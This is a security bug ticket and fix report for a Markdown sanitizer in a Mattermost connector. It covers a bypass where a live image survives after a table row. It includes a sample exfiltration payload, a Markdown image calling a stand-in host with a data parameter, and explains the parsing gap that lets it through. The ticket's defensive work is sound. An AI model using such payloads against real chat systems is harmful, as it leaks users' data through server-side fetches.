# FIX-197: An image survives the Mattermost outbound pipeline after a table row, where the code-span pairing differs (security, D-270)

## Goal
This is security-relevant. A live image or link that reaches Mattermost is fetched by the server: link previews, and data exfiltration through the URL (D-270; the outbound pipeline of FIX-142, FIX-182 and FIX-195). The CI Watcher found this on 2026-11-21. CI run 44835421666 on master d7a17d57, shard rust-test (1), failed `connectors/mattermost/tests/hostile_pipeline.rs` `hostile_text_reaches_mattermost_without_images_bad_links_or_code_broadcasts` with the property "an image opener outside code". It is a new case, separate from FIX-182 and FIX-195.

Minimal input:

```
<b> |a|b|\n|-|-|\n|1|2|![x](https://e.example/?d=S)| ` ![i](https://a.example/p.png) `@here`
```

Output:

```
 |a|b|\n|-|-|\n|1|2|[🖼 x (e.example)](<https://e.example/?d=S>)| ` ![i](https://a.example/p.png) `@here`
```

The table cell's image is defanged, but `![i](https://a.example/p.png)` survives verbatim. The sanitizer treats it as inline code, because it sits between the first and second backticks. The test's own Markdown reading, which matches Mattermost's renderer, pairs the backticks differently after a table row that ends in `|`: the second backtick opens a code span with the third, so the first is a stray. Mattermost would therefore render the image, and the server would fetch `a.example`. It is the same family as FIX-178 and FIX-195: the sanitizer's idea of what is code disagrees with the renderer's.

The proptest seed is `cc 88d0f684cf81c5a2a2aae085d42bfaec6921abc22965020859d80d232692b503`. Add it to `connectors/mattermost/tests/hostile_pipeline.proptest-regressions` **in the same commit as the fix**; until then it fails CI at random.

## Change
1. Find out why the two code-span readings disagree here. The likely causes, to confirm in the Completion report:
   - the table row: cells are split on `|` before or after code spans are found;
   - the trailing text after the last `|`;
   - the odd number of backticks on the line;
   - the `<b>` removal shifting the line into a table.
2. Fix it where it lives. The sanitizer must decide what is code **the way Mattermost's renderer does** (CommonMark code spans: backtick runs of equal length, left to right, inside table cells as the GFM table extension does). The sanitizer and the test's reference reading should share one implementation. If they cannot, the sanitizer must be conservative: when unsure whether text is code, treat it as **not** code and defang the image or link opener in it.
3. Check the neighbouring positions: an odd backtick run in a list item, a quote, a heading, and a table cell that itself holds backticks; double-backtick spans; a link opener `[..](..)` in the same position.
4. Never weaken a check or the property to make it pass. The last line of defence (`is_safe`, `has_bare_url`, the image-opener check) stays unchanged.

## Completion report
Lane B (`alexiri/p5-polish-b`), together with FIX-198 (one change), on master 492614ba. No API change, no
contract, no generated file.

**Cause (confirmed): the fourth suspect, the `<b>` removal shifting the line into a table.** Neither code reading
pairs the backticks wrongly. The pairing guess in the Goal was not what happened. Stage by stage
(the pipeline printed per stage):
- The core reads `<b> |a|b|` as a header of three cells against a delimiter row of two. That is no table, so the
  core sees one paragraph. In that paragraph `` ` ![i](…) ` `` is a code span, which the core leaves as typed. It is
  code in every reading.
- The connector drops the unpaired `<b>`, and ` |a|b|` now *is* a two-column table header. The row
  `|1|2|[🖼 …](…)| ` ![i](…) `@here`` then has two cells beyond the header's width. GFM (pulldown-cmark, so the
  connector's checks and the test) drops them and gives no event. Mattermost 11.7.15 renders them.
- The test's image-opener check finds `![` covered by no code range, so it fails.
- The connector's own `escape_table_excess` (FIX-195) runs *before* the conversion, when there was no table yet.
  Nothing escaped the extra pipes afterwards.

So the text the core left as code reached Mattermost in a structure no check could read.

Other cases of the same kind (in the tests): a code span the core read across the pipes of what becomes a table
row. After the `<b>` is dropped, GFM splits the cells first, and the halves are prose with a live `![`. A
heading or a `<br>` converted in the middle of a paragraph cuts a span that crossed the line.

**Fix: one code reading, applied to the text Mattermost receives (`aurora_core::sanitize::defang_prose`,
`connectors/mattermost/src/render.rs`).**
- `render_text` runs the core's prose rules again on the converted text, before the tokens and the last-line
  check: `defang_prose(&convert(…))`.
- `defang_prose` is the core's own `rewrite`, run to a fixed point (the same code: `rewrite_pass(src, html: false)`).
  It skips only the raw-HTML sanitizing, because the connector has converted the HTML already. It also skips the
  token defang, because the core's `<@here>`/`<@user:…>` tokens must survive to the token step.
- Read with the one dialect every check uses (pulldown-cmark, `13 §4.3`: CommonMark spans by equal run length,
  fences only at a line start with ≤ 3 spaces, GFM cells split before inline parsing), whatever is prose *now* is
  defanged:
  - `![` is broken, and an image becomes a `[🖼 …](…)` link;
  - `](` and `[x]:` look-alikes are broken;
  - a bare URL becomes `[url](url)`;
  - a link outside http/https/mailto becomes text;
  - a cell beyond the header's width becomes text of the last cell, so no part of the post is invisible to the
    checks.
- Code stays as typed.
- What the core saw no longer matters: when the two readings differ, the final reading decides, and anything
  not code there is treated as prose. That is the "unsure means not code" rule of the brief.
- The test's reference reading now calls the connector's own `convert::code_ranges` (the same parser and options
  as before, so the property is unchanged).

**Why nothing can reach Mattermost as prose undefanged.**
- `defang_prose` runs after every edit that can change the structure (the conversion). The steps after it only
  turn tokens into `@name`/`~channel`, or wrap a broadcast word in backticks; `defuse` uses a zero-width space
  instead whenever a stray backtick could pair.
- It covers every byte of the post. The extra cells become visible text, and no other GFM construct hides
  content.
- Already-safe text is a fixed point: the core's output passes unchanged (unit test), so ordinary posts do not
  change.
- The last line (`is_safe`, `has_bare_url`, the image-opener check) is unchanged and still checks every post.
